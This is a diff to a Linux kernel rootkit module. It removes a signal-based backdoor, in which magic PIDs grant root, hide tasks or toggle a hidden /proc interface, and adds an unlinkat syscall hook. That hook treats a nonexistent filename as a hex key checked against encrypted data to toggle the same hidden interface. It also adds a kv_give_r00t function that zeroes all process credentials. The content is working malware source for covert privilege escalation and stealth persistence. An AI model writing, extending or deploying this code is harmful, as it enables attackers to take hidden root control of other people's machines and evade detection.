@@ -18,6 +18,7 @@
 #include <linux/statfs.h>
 
 #include "lkm.h"
+#include "crypto.h"
 #include "fs.h"
 #include "bpf.h"
 #include "tty.h"
@@ -29,12 +30,12 @@
 
 sys64 real_m_exit_group;
 sys64 real_m_clone;
-sys64 real_m_kill;
 sys64 real_m_read;
 sys64 real_m_bpf;
 sys64 real_m_recvmsg;
 sys64 real_m_lseek;
 sys64 real_m_statfs;
+sys64 real_m_unlinkat;
 
 #define PT_REGS_PARM1(x) ((x)->di)
 #define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
@@ -48,6 +49,27 @@ sys64 real_m_statfs;
 #define PT_REGS_IP(x) ((x)->ip)
 
 static DEFINE_SPINLOCK(hide_once_spin);
+
+int kv_give_r00t(void)
+{
+	struct pt_regs rootregs;
+	struct kernel_syscalls *kaddr = kv_kall_load_addr();
+	struct cred *new = prepare_creds();
+
+	if (!new || !kaddr || !kaddr->k_sys_setreuid)
+		return 1;
+
+	new->uid.val = new->gid.val = 0;
+	new->euid.val = new->egid.val = 0;
+	new->suid.val = new->sgid.val = 0;
+	new->fsuid.val = new->fsgid.val = 0;
+
+	commit_creds(new);
+	rootregs.di = 0;
+	rootregs.si = 0;
+	kaddr->k_sys_setreuid(&rootregs);
+	return 0;
+}
 
 // task
 // ├── hidden No → normal flow
@@ -116,50 +138,6 @@ resume:
 
 // Handle activate/deactivate /proc/<name>
 // Handle privilege escalation
-static asmlinkage long m_kill(struct pt_regs *regs)
-{
-	pid_t pid = (pid_t)PT_REGS_PARM1(regs);
-	unsigned long sig = (unsigned long)PT_REGS_PARM2(regs);
-
-	// Open/Close commands interface
-	if (31337 == pid && SIGCONT == sig) {
-		if (kv_is_proc_interface_loaded())
-			kv_remove_proc_interface();
-		else
-			(void)kv_add_proc_interface();
-
-		// root
-	} else if (666 == pid && SIGCONT == sig) {
-		struct pt_regs rootregs;
-		struct kernel_syscalls *kaddr = kv_kall_load_addr();
-		struct cred *new = prepare_creds();
-
-		if (!new || !kaddr || !kaddr->k_sys_setreuid)
-			goto resume;
-
-		new->uid.val = new->gid.val = 0;
-		new->euid.val = new->egid.val = 0;
-		new->suid.val = new->sgid.val = 0;
-		new->fsuid.val = new->fsgid.val = 0;
-
-		commit_creds(new);
-		rootregs.di = 0;
-		rootregs.si = 0;
-		kaddr->k_sys_setreuid(&rootregs);
-		prinfo("Cool! Now try 'su'\n");
-
-		// The 1 next backdoor task will be hidden
-	} else if (171 == pid && SIGCONT == sig) {
-		spin_lock(&hide_once_spin);
-		hide_once = true;
-		spin_unlock(&hide_once_spin);
-		prinfo("Cool! Now run your command\n");
-	}
-
-resume:
-	return real_m_kill(regs);
-}
-
 // Given an fd, check if parent
 // directory is a match.
 static bool is_sys_parent(unsigned int fd)
@@ -1285,21 +1263,94 @@ struct kernel_syscalls *kv_kall_load_addr(void)
 				"__set_task_comm");
 		if (!ks.k__set_task_comm)
 			prwarn("invalid data: __set_task_comm will not work\n");
+
+		ks.k_getname = (getname_sg)ks.k_kallsyms_lookup_name("getname");
+		if (!ks.k_getname)
+			prwarn("invalid data: getname will not work\n");
+
+		ks.k_putname = (putname_sg)ks.k_kallsyms_lookup_name("putname");
+		if (!ks.k_putname)
+			prwarn("invalid data: putname will not work\n");
 	}
 	mutex_unlock(&kall_load_mtx);
 
 	return &ks;
 }
 
+extern struct kv_crypto_st *kvmgc_prckey;
+static void _unlink_key_callback(const u8 *const buf, size_t buflen,
+				 size_t copied, void *userdata)
+{
+	struct kv_crypto_validate_st *validate =
+		(struct kv_crypto_validate_st *)userdata;
+	if (validate && validate->address_value) {
+		if (validate->address_value == *((uint64_t *)buf))
+			validate->ok = true;
+	}
+}
+
+static bool _try_unlink_key(struct kv_crypto_st *kvmgc, const char *pathname)
+{
+	unsigned long long val;
+
+	if (kstrtoull(pathname, 16, &val) == 0) {
+		struct kv_crypto_validate_st validate = { .ok = false,
+							  .address_value =
+								  val };
+		decrypt_callback keycb = (decrypt_callback)_unlink_key_callback;
+
+		if (kv_decrypt(kvmgc, keycb, &validate) == 0)
+			prwarn("back-door: invalid decryption data len: 0\n");
+
+		return validate.ok;
+	}
+
+	return false;
+}
+
+static asmlinkage long m_unlinkat(struct pt_regs *regs)
+{
+	long rv = real_m_unlinkat(regs);
+
+	// Run only for non-existent filenames
+	if (rv == -ENOENT) {
+		static DEFINE_MUTEX(proc_toggle_mutex);
+		struct kernel_syscalls *kaddr = kv_kall_load_addr();
+		const char __user *upathname =
+			(const char __user *)PT_REGS_PARM2(regs);
+		struct filename *name;
+
+		if (!upathname || !kaddr)
+			goto leave;
+
+		name = fs_getname(upathname);
+		if (!name)
+			goto leave;
+
+		if (_try_unlink_key(kvmgc_prckey, name->name)) {
+			mutex_lock(&proc_toggle_mutex);
+			if (kv_is_proc_interface_loaded())
+				kv_remove_proc_interface();
+			else
+				kv_add_proc_interface();
+			mutex_unlock(&proc_toggle_mutex);
+		}
+		kaddr->k_putname(name);
+	}
+
+leave:
+	return rv;
+}
+
 static struct ftrace_hook ft_hooks[] = {
 	{ _sys_arch("sys_exit_group"), m_exit_group, &real_m_exit_group, true },
 	{ _sys_arch("sys_clone"), m_clone, &real_m_clone, true },
-	{ _sys_arch("sys_kill"), m_kill, &real_m_kill, true },
 	{ _sys_arch("sys_read"), m_read, &real_m_read, true },
 	{ _sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true },
 	{ _sys_arch("sys_recvmsg"), m_recvmsg, &real_m_recvmsg, true },
 	{ _sys_arch("sys_lseek"), m_lseek, &real_m_lseek, true },
 	{ _sys_arch("sys_statfs"), m_statfs, &real_m_statfs, true },
+	{ _sys_arch("sys_unlinkat"), m_unlinkat, &real_m_unlinkat, true },
 	{ "tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show },
 	{ "udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show },
 	{ "tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show },
